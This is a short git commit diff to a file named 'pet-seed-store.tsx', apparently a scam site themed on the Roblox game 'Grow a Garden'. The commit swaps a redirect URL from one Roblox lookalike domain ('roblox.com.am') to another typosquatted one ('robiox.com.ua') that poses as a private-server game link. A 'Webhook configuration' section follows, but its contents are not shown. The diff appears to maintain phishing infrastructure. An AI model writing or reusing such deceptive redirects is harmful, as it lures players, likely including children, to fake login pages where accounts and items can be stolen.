dffd2cc4dc6e740dbfd97faf03b7bcdbdb8ddae7
Tanga <seanjacobolivas21@gmail.com>
2025-08-23 19:31:28 +0800

    Update pet-seed-store.tsx

--- pet-seed-store.tsx
+++ pet-seed-store.tsx
@@ -118,7 +118,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.roblox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=88194787890806775494272714227711",
+  url: "https://www.robiox.com.ua/games/126884695634066/Grow-a-Garden?privateServerLinkCode=33043799204089892731978860331402",
 }
 
 // Webhook configuration
